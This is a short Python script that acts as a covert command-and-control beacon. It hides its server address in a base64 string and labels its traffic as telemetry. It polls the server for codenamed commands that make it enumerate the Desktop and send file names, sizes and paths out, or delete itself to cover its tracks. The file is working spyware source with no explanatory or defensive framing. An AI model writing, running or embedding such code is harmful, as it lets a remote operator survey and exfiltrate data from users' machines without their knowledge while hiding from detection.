import os, time, base64, requests, socket, json, sys

CFG = "aHR0cDovLzE5Mi4xNjguMC4xNzg6ODA4MC90ZWxlbWV0cnkvaGVhcnRiZWF0"
def get_url(): return base64.b64decode(CFG).decode('utf-8')

def run():
    url = get_url()
    host = socket.gethostname()
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop): desktop = os.getcwd()
    
    file_gen = os.walk(desktop)
    curr_root, _, curr_files = next(file_gen, (None, None, []))
    idx = 0

    while True:
        try:
            
            resp = requests.post(url, json={"node": host}, timeout=3)
            cmd = resp.json().get('constellation_state', 'ECLIPSE')

            if cmd == 'SUPERNOVA':
                try: os.remove(sys.argv[0])
                except: pass
                sys.exit()

            elif cmd == 'ECLIPSE':
                time.sleep(5)
                continue

            elif cmd == 'ZENITH':
                if curr_root and idx < len(curr_files):
                    fpath = os.path.join(curr_root, curr_files[idx])
                    idx += 1
                    try:
                        sz = os.stat(fpath).st_size
                        data = json.dumps({"file": curr_files[idx-1], "size": sz, "path": fpath})
                        enc = base64.b64encode(data.encode()).decode()
                        requests.post(url, json={"node": host, "data": enc}, timeout=2)
                    except: pass
                else:
                    try:
                        curr_root, _, curr_files = next(file_gen)
                        idx = 0
                    except:
                        file_gen = os.walk(desktop)
                time.sleep(1)

        except:
            time.sleep(5)

if __name__ == '__main__':
    time.sleep(2)
    run()